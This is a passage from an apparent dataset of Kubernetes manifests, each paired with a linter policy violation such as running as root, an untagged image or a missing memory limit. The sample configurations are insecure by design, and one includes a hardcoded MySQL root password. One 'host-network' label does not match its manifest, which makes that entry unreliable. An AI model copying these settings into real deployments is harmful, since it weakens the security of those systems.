all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"migrate\" has memory limit 0"
  },
  {
    "id": "11620",
    "manifest_path": "data/manifests/the_stack_sample/sample_4478.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hydra\n  labels:\n    name: hydra\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: hydra\n  template:\n    metadata:\n      labels:\n        name: hydra\n    spec:\n      initContainers:\n      - name: migrate\n        args:\n        - migrate\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - sql\n        - -e\n        - --yes\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: HYDRA_DATABASE\n          value: hydra\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        image: oryd/hydra:v1.9.2-sqlite\n        volumeMounts:\n        - mountPath: /etc/config/hydra\n          name: config\n      containers:\n      - name: server\n        image: oryd/hydra:v1.9.2-sqlite\n        args:\n        - serve\n        - -c\n        - /etc/config/hydra/hydra.yml\n        - all\n        envFrom:\n        - configMapRef:\n            name: pl-db-config\n        - configMapRef:\n            name: pl-domain-config\n        env:\n        - name: PL_POSTGRES_USERNAME\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_USERNAME\n        - name: PL_POSTGRES_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: pl-db-secrets\n              key: PL_POSTGRES_PASSWORD\n        - name: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: OIDC_SUBJECT_IDENTIFIERS_PAIRWISE_SALT\n        - name: SECRETS_SYSTEM\n          valueFrom:\n            secretKeyRef:\n              name: pl-hydra-secrets\n              key: SECRETS_SYSTEM\n        - name: DSN\n          value: postgres://$(PL_POSTGRES_USERNAME):$(PL_POSTGRES_PASSWORD)@$(PL_POSTGRES_HOSTNAME):$(PL_POSTGRES_PORT)/$(PL_POSTGRES_DB)?sslmode=disable&max_conns=20&max_idle_conns=4\n        - name: SERVE_TLS_CERT_PATH\n          value: /certs/server.crt\n        - name: SERVE_TLS_KEY_PATH\n          value: /certs/server.key\n        - name: PL_WORK_DOMAIN\n          value: work.$(PL_DOMAIN_NAME)\n        - name: PL_OAUTH_DOMAIN\n          value: $(PL_WORK_DOMAIN)/oauth\n        - name: HYDRA_URL\n          value: https://$(PL_OAUTH_DOMAIN)/hydra\n        - name: URLS_CONSENT\n          value: https://$(PL_OAUTH_DOMAIN)/auth/hydra/consent\n        - name: URLS_LOGIN\n          value: https://$(PL_WORK_DOMAIN)/api/auth/oauth/login\n        - name: URLS_LOGOUT\n          value: https://$(PL_OAUTH_DOMAIN)/logout\n        - name: URLS_SELF_PUBLIC\n          value: $(HYDRA_URL)\n        - name: URLS_SELF_ISSUER\n          value: $(HYDRA_URL)\n        ports:\n        - containerPort: 4444\n        - containerPort: 4445\n        - containerPort: 5555\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config/hydra\n        - name: certs\n          mountPath: /certs\n        resources: {}\n      volumes:\n      - name: config\n        configMap:\n          name: hydra-config\n          items:\n          - key: hydra.yml\n            path: hydra.yml\n      - name: certs\n        secret:\n          secretName: service-tls-certs\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"server\" has memory limit 0"
  },
  {
    "id": "11621",
    "manifest_path": "data/manifests/the_stack_sample/sample_4480.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: coredns\n  name: coredns\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n            weight: 100\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchLabels:\n                k8s-app: kube-dns\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - args:\n        - -conf\n        - /etc/coredns/Corefile\n        image: megaease/coredns:latest\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: coredns\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /ready\n            port: 8181\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/coredns\n          name: config-volume\n      securityContext: {}\n      serviceAccount: coredns\n      serviceAccountName: coredns\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: Corefile\n            path: Corefile\n          name: coredns\n        name: config-volume\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"coredns\" is using an invalid container image, \"megaease/coredns:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11622",
    "manifest_path": "data/manifests/the_stack_sample/sample_4480.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: coredns\n  name: coredns\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n            weight: 100\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchLabels:\n                k8s-app: kube-dns\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - args:\n        - -conf\n        - /etc/coredns/Corefile\n        image: megaease/coredns:latest\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: coredns\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /ready\n            port: 8181\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/coredns\n          name: config-volume\n      securityContext: {}\n      serviceAccount: coredns\n      serviceAccountName: coredns\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: Corefile\n            path: Corefile\n          name: coredns\n        name: config-volume\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"coredns\" does not expose port 8080 for the HTTPGet"
  },
  {
    "id": "11623",
    "manifest_path": "data/manifests/the_stack_sample/sample_4480.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: coredns\n  name: coredns\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n            weight: 100\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchLabels:\n                k8s-app: kube-dns\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - args:\n        - -conf\n        - /etc/coredns/Corefile\n        image: megaease/coredns:latest\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: coredns\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /ready\n            port: 8181\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/coredns\n          name: config-volume\n      securityContext: {}\n      serviceAccount: coredns\n      serviceAccountName: coredns\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: Corefile\n            path: Corefile\n          name: coredns\n        name: config-volume\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"coredns\" not found"
  },
  {
    "id": "11624",
    "manifest_path": "data/manifests/the_stack_sample/sample_4480.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: coredns\n  name: coredns\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n            weight: 100\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchLabels:\n                k8s-app: kube-dns\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - args:\n        - -conf\n        - /etc/coredns/Corefile\n        image: megaease/coredns:latest\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: coredns\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /ready\n            port: 8181\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/coredns\n          name: config-volume\n      securityContext: {}\n      serviceAccount: coredns\n      serviceAccountName: coredns\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: Corefile\n            path: Corefile\n          name: coredns\n        name: config-volume\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"coredns\" does not expose port 8181 for the HTTPGet"
  },
  {
    "id": "11625",
    "manifest_path": "data/manifests/the_stack_sample/sample_4480.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  annotations:\n    deployment.kubernetes.io/revision: '1'\n  labels:\n    k8s-app: kube-dns\n    kubernetes.io/name: coredns\n  name: coredns\n  namespace: kube-system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      k8s-app: kube-dns\n  template:\n    metadata:\n      labels:\n        k8s-app: kube-dns\n    spec:\n      affinity:\n        nodeAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - preference:\n              matchExpressions:\n              - key: node-role.kubernetes.io/master\n                operator: In\n                values:\n                - ''\n            weight: 100\n        podAntiAffinity:\n          requiredDuringSchedulingIgnoredDuringExecution:\n          - labelSelector:\n              matchLabels:\n                k8s-app: kube-dns\n            topologyKey: kubernetes.io/hostname\n      containers:\n      - args:\n        - -conf\n        - /etc/coredns/Corefile\n        image: megaease/coredns:latest\n        imagePullPolicy: IfNotPresent\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /health\n            port: 8080\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: coredns\n        ports:\n        - containerPort: 53\n          name: dns\n          protocol: UDP\n        - containerPort: 53\n          name: dns-tcp\n          protocol: TCP\n        - containerPort: 9153\n          name: metrics\n          protocol: TCP\n        readinessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /ready\n            port: 8181\n            scheme: HTTP\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 5\n        resources:\n          limits:\n            memory: 170Mi\n          requests:\n            cpu: 100m\n            memory: 70Mi\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            add:\n            - NET_BIND_SERVICE\n            drop:\n            - all\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/coredns\n          name: config-volume\n      securityContext: {}\n      serviceAccount: coredns\n      serviceAccountName: coredns\n      volumes:\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: Corefile\n            path: Corefile\n          name: coredns\n        name: config-volume\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"coredns\" is not set to runAsNonRoot"
  },
  {
    "id": "11626",
    "manifest_path": "data/manifests/the_stack_sample/sample_4481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kubesphere\n    component: ks-sample\n    tier: backend\n  name: ks-sample\n  namespace: kubesphere-sample-prod\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubesphere\n      component: ks-sample\n      tier: backend\n  template:\n    metadata:\n      labels:\n        app: kubesphere\n        component: ks-sample\n        tier: backend\n    spec:\n      containers:\n      - env:\n        - name: CACHE_IGNORE\n          value: js|html\n        - name: CACHE_PUBLIC_EXPIRATION\n          value: 3d\n        image: $REGISTRY/$HARBOR_NAMESPACE/$APP_NAME:$TAG_NAME\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          timeoutSeconds: 10\n          failureThreshold: 30\n          periodSeconds: 5\n        imagePullPolicy: Always\n        name: ks\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 1000Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "11627",
    "manifest_path": "data/manifests/the_stack_sample/sample_4481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kubesphere\n    component: ks-sample\n    tier: backend\n  name: ks-sample\n  namespace: kubesphere-sample-prod\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubesphere\n      component: ks-sample\n      tier: backend\n  template:\n    metadata:\n      labels:\n        app: kubesphere\n        component: ks-sample\n        tier: backend\n    spec:\n      containers:\n      - env:\n        - name: CACHE_IGNORE\n          value: js|html\n        - name: CACHE_PUBLIC_EXPIRATION\n          value: 3d\n        image: $REGISTRY/$HARBOR_NAMESPACE/$APP_NAME:$TAG_NAME\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          timeoutSeconds: 10\n          failureThreshold: 30\n          periodSeconds: 5\n        imagePullPolicy: Always\n        name: ks\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 1000Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ks\" does not have a read-only root file system"
  },
  {
    "id": "11628",
    "manifest_path": "data/manifests/the_stack_sample/sample_4481.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: kubesphere\n    component: ks-sample\n    tier: backend\n  name: ks-sample\n  namespace: kubesphere-sample-prod\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: kubesphere\n      component: ks-sample\n      tier: backend\n  template:\n    metadata:\n      labels:\n        app: kubesphere\n        component: ks-sample\n        tier: backend\n    spec:\n      containers:\n      - env:\n        - name: CACHE_IGNORE\n          value: js|html\n        - name: CACHE_PUBLIC_EXPIRATION\n          value: 3d\n        image: $REGISTRY/$HARBOR_NAMESPACE/$APP_NAME:$TAG_NAME\n        readinessProbe:\n          httpGet:\n            path: /\n            port: 8080\n          timeoutSeconds: 10\n          failureThreshold: 30\n          periodSeconds: 5\n        imagePullPolicy: Always\n        name: ks\n        ports:\n        - containerPort: 8080\n          protocol: TCP\n        resources:\n          limits:\n            cpu: 500m\n            memory: 1000Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ks\" is not set to runAsNonRoot"
  },
  {
    "id": "11629",
    "manifest_path": "data/manifests/the_stack_sample/sample_4487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-132\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11630",
    "manifest_path": "data/manifests/the_stack_sample/sample_4487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-132\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "11631",
    "manifest_path": "data/manifests/the_stack_sample/sample_4487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-132\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "11632",
    "manifest_path": "data/manifests/the_stack_sample/sample_4487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-132\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "11633",
    "manifest_path": "data/manifests/the_stack_sample/sample_4487.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-132\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "11634",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "host-network",
    "violation_text": "resource shares host's network namespace (via hostNetwork=true)."
  },
  {
    "id": "11635",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mysql\" is using an invalid container image, \"mysql\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "11636",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql\" does not have a read-only root file system"
  },
  {
    "id": "11637",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"php\" does not have a read-only root file system"
  },
  {
    "id": "11638",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql\" is not set to runAsNonRoot"
  },
  {
    "id": "11639",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"php\" is not set to runAsNonRoot"
  },
  {
    "id": "11640",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql\" has cpu request 0"
  },
  {
    "id": "11641",
    "manifest_path": "data/manifests/the_stack_sample/sample_4489.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: my-deployment\n  labels:\n    app: goproxy\nspec:\n  selector:\n    matchLabels:\n      app: goproxy\n  template:\n    metadata:\n      name: goproxy\n      labels:\n        app: goproxy\n    spec:\n      containers:\n      - name: mysql\n        image: mysql\n        env:\n        - name: MYSQL_ROOT_PASSWORD\n          value: rootpasswd\n      - name: php\n        image: php:7.0-apache\n        volumeMounts:\n        - mountPath: /var/www/html\n          name: site-data\n          subPath: html\n      volumes:\n      - name: site-data\n        persistentVolumeClaim:\n          claimName: my-lamp-site-data\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"php\" has cpu request 0"
  },
  {
